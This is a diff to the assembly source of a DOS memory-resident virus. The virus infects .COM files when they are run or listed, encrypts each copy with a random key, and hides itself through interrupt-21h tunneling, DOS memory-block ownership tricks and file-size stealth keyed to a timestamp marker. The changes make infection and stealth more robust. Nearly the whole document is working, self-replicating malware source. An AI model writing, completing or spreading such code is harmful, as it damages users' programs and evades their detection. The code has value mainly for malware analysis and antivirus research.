@@ -10,7 +10,8 @@
 ;
 ; The virus infects on both execute (4b00h) and find first/next (11h/12h).
 ; If an infected file is being touched with the directory functions
-; (11h/12h/4eh/4fh), the virus will stealth the filesize.
+; (11h/12h/4eh/4fh), the virus will stealth the filesize. File access mode
+; changes are done through SFT manipulation.
 ;
 ; Disclaimer:
 ; I take no responsibility for any damage, either direct or implied,
@@ -24,10 +25,11 @@
 	locals @@
 
 VirusSize	equ	EndVirus-BeginVirus
-ParagraphSize	equ	VirusSize/16+2
-TimeStamp	equ	10001b				; Stealth marker
+ParagraphSize	equ	(EndHeapSection-BeginVirus+15)/16
+StealthMarker	equ	10001b				; Stealth marker
 VirusInterrupt	equ	7979h
-VirusIdentifier	equ	'bA'
+VirusHandshake	equ	'JG'
+ComMarker	equ	'@'
 
 ;---------------------------------------------------------------------
 ;	The virus begins here
@@ -43,7 +45,7 @@ BeginVirus:
 BeginEncryptedSection:
 	mov	ax, VirusInterrupt			; Check if in mem
 	int	21h
-	cmp	ax, VirusIdentifier
+	cmp	ax, VirusHandshake
 	je	AlreadyResident
 
 	mov	ah, 4ah					; Get size of mem
@@ -55,15 +57,18 @@ BeginEncryptedSection:
 	mov	ah, 48h					; Allocate memory
 	mov	bx, ParagraphSize
 	int	21h
-	sub	ax, 10h					; Compensate org 100h
+	jc	AlreadyResident
+	dec	ax					; ax-1 = MCB
+	mov	es, ax
+	mov	word ptr es:[1], 8h			; Mark DOS as owner
+	sub	ax, 0fh					; Compensate org 100h
 	mov	es, ax
 	mov	di, 100h
 	lea	si, [bp+offset BeginVirus]
 	mov	cx, VirusSize
-	rep	movsb					; Copy virii to mem
+	rep	movsb					; Copy virus to mem
 	push	es
 	pop	ds
-	inc	byte ptr ds:[0f1h]			; Change block owner
 
 	push	cs
 	call	InstallInt21hHandler			; Jump to tunneler
@@ -75,7 +80,7 @@ AlreadyResident:
 	push	cs
 	pop	es
 	pop	ds
-	lea	si, [bp+OrgBuf]
+	lea	si, [bp+OldJmp]
 	movsw						; Copy first bytes
 	movsw
 	ret						; Return
@@ -124,8 +129,7 @@ InstallInt21hHandler:
 
 	pushf						; Get flags
 	pop	ax
-	test	ah, 1h					; Check trap flag
-	pushf
+	push	ax
 	and	ah, 0feh				; Turn off trap flag
 	push	ax
 	popf
@@ -136,13 +140,15 @@ InstallInt21hHandler:
 	push	cs
 	pop	ds
 
-	popf
-	jnz	@@next2
+	pop	cx					; Discard leftover flags
+	cmp	byte ptr cs:Tunneled, 1			; Did the tunnel install?
+	je	@@next2
 
-	mov	ah, 25h
-	mov	dx, offset Int21hHandler
+	mov	ax, 2521h				; No, fall back to a plain
+	mov	dx, offset Int21hHandler		; int21 vector hook
 	int	21h
 @@next2:retf
+Tunneled	db	0
 
 Int01hHandler:
 	mov	cs:OrigAx, ax				; Save registers
@@ -187,15 +193,19 @@ OrigCx	dw	?
 	mov	si, si[3]
 @@next5:db	81h, 7ch, 02h				; cmp ds:si[2], mcb
 OrigMcb	dw	?					; See if jmp is to dos
-	jnb	@@next6
+	jb	@@dohook				; Below MCB: DOS in low mem
+	cmp	word ptr [si+2], 0f000h			; In HMA: DOS loaded high
+	jb	@@next6					; Between: a TSR, keep tracing
+@@dohook:
 	push	ax
 	mov	ax, si[0]				; Get offset address
 	mov	cs:Int21o, ax
 	mov	ax, si[2]				; Get segment address
 	mov	cs:Int21s, ax
-	mov	si[0], offset Int21hHandler		; Install int21 handler
+	mov	word ptr si[0], offset Int21hHandler	; Install int21 handler
 	mov	si[2], cs
 	pop	ax
+	mov	byte ptr cs:Tunneled, 1			; Record successful tunnel
 	and	ch, 0feh				; Clear trap flag
 @@next6:pop	si
 	jmp	@@next2
@@ -207,7 +217,7 @@ OrigMcb	dw	?					; See if jmp is to dos
 Int21hHandler:
 	cmp	ax, VirusInterrupt			; Return installation
 	jne	@@next1
-	mov	ax, VirusIdentifier
+	mov	ax, VirusHandshake
 	iret
 @@next1:cmp	ax, 4b00h				; Execute?
 	jne	@@next2
@@ -221,7 +231,7 @@ Int21hHandler:
 	cmp	ah, 4fh					; Stealth Handle
 	je	StealthFindMatchingFile
 
-OldInt21h:
+OldInt21h:						; Jump to old int21h
 	db	0eah
 Int21o	dw	?
 Int21s	dw	?
@@ -244,7 +254,7 @@ StealthFindMatchingFileFCB:				; 11h/12h
 	int	21h
 	mov	es, bx
 	cmp	bx, es:[16h]				; Ensure that dos is calling
-	jne	SkipStealth
+	jne	@@skip
 
 	mov	ah, 2fh					; Get dta
 	int	21h
@@ -260,12 +270,17 @@ StealthFindMatchingFileFCB:				; 11h/12h
 
 	mov	ax, [bx+14h]				; get time stamp
 	and	al, 00011111b				; kill all but secs...
-	xor	al, TimeStamp				; xor with our marker
+	xor	al, StealthMarker			; xor with our marker
 	jz	DoStealth
+
+	cmp	word ptr [si+8], 'OC'			; Only infect .COM files
+	jne	@@skip
+	cmp	byte ptr [si+10], 'M'
+	jne	@@skip
 
 	push	cs					; Convert to asciz
 	pop	es
-	mov	di, offset EndVirus
+	mov	di, offset FileName
 	mov	cx, 8
 @@loop1:lodsb
 	cmp	al, ' '
@@ -280,11 +295,11 @@ StealthFindMatchingFileFCB:				; 11h/12h
 
 	xor	al, al
 	stosb
-	mov	dx, offset EndVirus
+	mov	dx, offset FileName
 	push	cs
 	pop	ds
 	call	InfectFile
-	jmp	SkipStealth
+@@skip:	jmp	SkipStealth
 
 StealthFindMatchingFile:				; 4e/4f
 	pushf
@@ -303,10 +318,15 @@ StealthFindMatchingFile:				; 4e/4f
 	mov	ax, [bx+16h]				; get time stamp
 
 	and	al, 00011111b				; kill all but secs...
-	xor	al, TimeStamp				; xor with our marker
+	xor	al, StealthMarker			; xor with our marker
 	jnz	SkipStealth				; not ours :(
 
 DoStealth:
+	cmp	word ptr [bx+1ah], VirusSize		; Too small to be us
+	jb	SkipStealth
+	cmp	word ptr [bx+1ch], 0			; Too large for us (>64k)
+	ja	SkipStealth
+
 	sub	word ptr [bx+1ah], VirusSize
 	sbb	word ptr [bx+1ch], 0
 
@@ -330,6 +350,9 @@ InfectFile:
 
 	mov	ax, 3d00h				; open file
 	int	21h
+	jnc	@@opened
+	jmp	@@done
+@@opened:
 	xchg	ax, bx
 
 	call	CheckSFT				; es:di+20h points to file name
@@ -342,42 +365,78 @@ InfectFile:
 
 @@next2:mov	byte ptr es:[di-26h], 2
 
-	mov	ax, 4200h				; seek tof
-	xor	cx, cx
-	cwd
-	int	21h
+	xor	al, al					; Go SOF
+	call	SetFilePointer
 
 	push	cs					; cs=ds
 	pop	ds
 
-	mov	ax, 5700h				; get time/date
+	mov	ax, 5700h				; Get time/date
 	int	21h
 	mov	Time, cx
 	mov	Date, dx
 
-	mov	ah, 3fh					; read first four bytes to OrgBuf
+	mov	ah, 3fh					; read first four bytes to OldJmp
 	mov	cx, 4
-	mov	dx, offset ds:OrgBuf
+	mov	dx, offset ds:OldJmp
 	int	21h
 
-	cmp	byte ptr ds:OrgBuf+3, '@'		; dont reinfect!
+	cmp	byte ptr ds:OldJmp+3, ComMarker		; dont reinfect!
 	je	@@skip
 
-	mov	ax, 4202h				; go end of file, offset in dx:cx
-	xor	cx, cx					; and return file size in dx:ax.
-	xor	dx, dx
-	int	21h
+	mov	al, 2h					; Go EOF
+	call	SetFilePointer
+
+	or	dx, dx					; > 64K?
+	jnz	@@skip
+	cmp	ax, (0ffffh-VirusSize)			; Dont infect too big
+	jae	@@skip
 
 	add	ax, offset EntryPoint-103h		; calculate entry offset to jmp
-	mov	word ptr ds:NewBuf[1], ax		; move it [ax] to NewBuf
+	mov	word ptr ds:NewJmp[1], ax		; move it [ax] to NewJmp
 
-@@loop:	mov	ah, 2ch					; get random number and put Key
+	call	WriteVirus
+
+	xor	al, al					; Go SOF
+	call	SetFilePointer
+
+	mov	ah, 40h					; and write a new-jmp-construct
+	mov	cx, 4					; of 4 bytes (4byte=infection marker)
+	mov	dx, offset NewJmp
+	int	21h
+
+	mov	ax, 5701h				; restore
+	mov	dx, Date
+	mov	cx, Time
+	and	cl, 11100000b				; zero sec's
+	or	cl, StealthMarker			; mark with our infection marker
+	int	21h
+
+@@skip:	mov	ah, 3eh					; Close file
+	int	21h
+
+@@done:	pop	dx ds di si cx bx ax bp es
+	ret
+
+;---------------------------------------------------------------------
+;	Helper functions
+;---------------------------------------------------------------------
+
+SetFilePointer:
+	mov	ah, 42h					; Jump in file
+	xor	cx, cx
+	cwd
+	int	21h
+	ret
+
+WriteVirus:
+@@loop:	mov	ah, 2ch					; Get random number
 	int	21h
 	or	dl, dl					; dl=0 - get another value!
 	je	@@loop
-	mov	ds:Key, dx
+	mov	word ptr ds:[Key], dx
 
-	mov	ax, 08d00h				; copy entire virus to 8d00h:100h
+	mov	ax, 08d00h				; Copy virus to 8d00h:100h
 	mov	es, ax
 	mov	di, 100h
 	mov	si, di
@@ -385,43 +444,17 @@ InfectFile:
 	rep	movsw
 	push	es
 	pop	ds
-	xor	bp, bp					; and encrypt it there
+	xor	bp, bp					; And encrypt it there
 	call	EncryptDecrypt
 
-	mov	ah, 40h					; write virus to file from position
+	mov	ah, 40h					; Write virus to file
 	mov	cx, VirusSize
 	mov	dx, offset BeginVirus
 	int	21h
 
 	push	cs					; cs=ds
 	pop	ds
-
-	mov	ax, 4200h				; go to beginning of file
-	xor	cx, cx
-	cwd
-	int	21h
-
-	mov	ah, 40h					; and write a new-jmp-construct
-	mov	cx, 4					; of 4 bytes (4byte=infection marker)
-	mov	dx, offset NewBuf
-	int	21h
-
-	mov	ax, 5701h				; restore
-	mov	dx, Date
-	mov	cx, Time
-	and	cl, 11100000b				; zero sec's
-	or	cl, TimeStamp				; mark with our infection marker
-	int	21h
-
-@@skip:	mov	ah, 3eh					; Close file
-	int	21h
-
-	pop	dx ds di si cx bx ax bp es
 	ret
-
-;---------------------------------------------------------------------
-;	Helper functions
-;---------------------------------------------------------------------
 
 CheckSFT:
 	push	bx
@@ -465,11 +498,17 @@ GetDelta:
 	call	EncryptDecrypt				; Decrypt virus
 	jmp	BeginEncryptedSection
 
-NewBuf	db	0e9h, 00h, 00h, '@'			; New entry buffer
-OrgBuf	db	0cdh, 20h, 00h, 00h			; 4 byte buffer
-
-FilenameOffset	dw	0
+NewJmp	db	0e9h, 00h, 00h, ComMarker		; New entry buffer
+OldJmp	db	0cdh, 20h, 00h, 00h			; 4 byte buffer
 
 EndVirus:
+
+;---------------------------------------------------------------------
+;	The heap begins below
+;---------------------------------------------------------------------
+
+FileName	db	13 dup (?)
+
+EndHeapSection:
 
 end
